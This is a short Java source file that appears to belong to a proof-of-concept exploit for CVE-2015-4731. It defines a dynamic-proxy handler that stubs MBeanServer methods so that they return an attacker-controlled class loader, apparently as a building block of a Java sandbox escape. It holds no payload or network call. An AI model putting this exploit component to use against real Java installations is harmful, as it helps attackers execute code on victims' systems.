package poc.cve_2015_4731;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

import javax.management.loading.ClassLoaderRepository;

public class MBeanProxy implements InvocationHandler {
	
	private static MBeanProxy INSTANCE = new MBeanProxy( );
	
	@SuppressWarnings("rawtypes")
	public static < T > T as( Class< T > clazz ) {
		final ClassLoader cl = MBeanProxy.class.getClassLoader();
		final Class[] interfaces = {
				clazz
		};
		
		return clazz.cast( java.lang.reflect.Proxy.newProxyInstance( cl, interfaces, MBeanProxy.INSTANCE ) );
	}

	@Override
	public Object invoke( Object proxy, Method method, Object[] args ) throws Throwable {
		final String methodName = method.getName();
		if( methodName.equals( "getClassLoaderRepository" ) ) {
			return MBeanProxy.as( ClassLoaderRepository.class );
		}
		else if( methodName.equals( "getClassLoaderFor" ) ) {
			return MBeanProxy.class.getClassLoader();
		}
		
		throw new AssertionError( "Method not implemented: " + method );
	}
	
}
